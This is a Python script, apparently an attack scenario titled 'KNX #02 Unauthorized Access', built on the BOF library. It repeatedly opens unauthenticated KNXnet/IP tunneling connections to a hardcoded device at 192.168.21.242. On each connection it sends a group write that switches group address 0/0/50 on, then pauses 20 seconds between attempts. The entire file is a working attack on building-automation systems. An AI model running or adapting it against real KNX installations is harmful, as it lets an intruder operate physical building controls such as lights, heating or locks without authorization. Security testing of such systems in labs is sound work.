from bof.layers import knx
from bof import BOFNetworkError
from bof.layers.knx.knx_network import *
from bof.layers.knx.knx_packet import *
from bof.layers.knx.knx_messages import *
import time

# Pause execution for 20 seconds. It reduces the risk of being perceived as a DDoS attack while still maintaining a reasonable level of efficiency. 
def sleep():
    time.sleep(20)   

knxnet = knx.KNXnet()

i=1
while True:
    try:
        print("KNX #02 Unauthorized Acccess - Try #", i)        
        knxnet.connect("192.168.21.242", 3671)
        response, source = knxnet.sr(connect_request_tunneling(knxnet))
        try:
            response_data_block = response.scapy_pkt.connection_response_data_block
            knx_source_address = response_data_block.connection_data.knx_individual_address
            channel = response.scapy_pkt.communication_channel_id
        except AttributeError:
            raise BOFNetworkError("Cannot extract required data from response.") from None
        # Send group write request, wait for ack and response, ack back
        cemi = cemi_group_write("0/0/50", 1, knx_source_address)
        tr = tunneling_request(channel, 0, cemi)
        #tr.show2()
        ack, source = knxnet.sr(tr)
        response, source = knxnet.receive()
        knxnet.send(tunneling_ack(channel, 0))
        # End tunneling connection
        response, source = knxnet.sr(disconnect_request(knxnet, channel))
        knxnet.disconnect()
        
        sleep()
                
    except BOFNetworkError as bne:
        print(str(bne))
        print("New attempt")
        i+=1
        continue
    finally:
        knxnet.disconnect()
        i+=1
